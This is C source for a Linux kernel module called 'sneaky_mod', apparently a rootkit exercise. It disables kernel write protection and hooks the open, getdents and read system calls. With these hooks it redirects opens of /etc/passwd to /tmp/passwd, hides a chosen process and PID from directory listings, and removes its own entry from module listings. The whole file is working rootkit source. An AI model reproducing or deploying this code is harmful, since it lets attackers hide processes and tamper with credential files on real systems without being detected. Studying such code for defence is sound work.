#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 1024

struct linux_dirent {
  u64            d_ino;
  s64            d_off;
  unsigned short d_reclen;
  char           d_name[BUFFLEN];
};

//define the Process ID paramenter
MODULE_LICENSE("GPL");
static pid_t processid = 0;

module_param(processid, int, 0);
MODULE_PARM_DESC(processid, "Process ID");
//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
				    unsigned int count);
asmlinkage ssize_t(*original_read)(int fd, void *buf, size_t count);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  if(strstr(pathname,"/etc/passwd")){
    const char* other = "/tmp/passwd";
    copy_to_user(pathname, other, strlen(pathname));
    }
  return original_call(pathname, flags);
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
				   unsigned int count)
{
  int nread, bpos;
  int size = 0;
  int result;
  char buf[20];
  sprintf(buf,"%d", processid);
  struct linux_dirent *cur = dirp;
  nread = original_getdents(fd, dirp, count);
  result = nread;
  while(nread > 0){
    if((strcmp(cur->d_name,"sneaky_process") == 0)||(strcmp(cur->d_name, buf) == 0)){
      // printf("here\n");
      size = size + cur->d_reclen;
      struct linux_dirent *temp;
      int backup;
      temp = (struct linux_dirent *)((char*)cur + cur->d_reclen);
      backup = (char*)dirp + result - (char*)cur - cur->d_reclen;
      memmove((char*)cur, (char*)temp, backup);
    }
    else{
      bpos=cur->d_reclen;
      cur = (struct linux_dirent *)((char*)cur + bpos);
      nread = nread - bpos;
    }
  }
  result -= size;
  return result;
}

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
  ssize_t result = original_read(fd, buf, count);
  ssize_t size = result;
  char* begin = strstr(buf, "sneaky_mod ");
  int len = 0;
    if(begin!=NULL){
    char* next = begin;
    //len = 1;
    while((*next)!='\n'){
      next = next + 1;
      //len++;
    }
    //len++;
    next = next + 1;
    len = next - begin;
    size = size - (next - (char*)buf);
    memmove(begin, next, size);
    }
  result = result - len;
  return result; 
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "Process ID is %d.\n",processid);
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
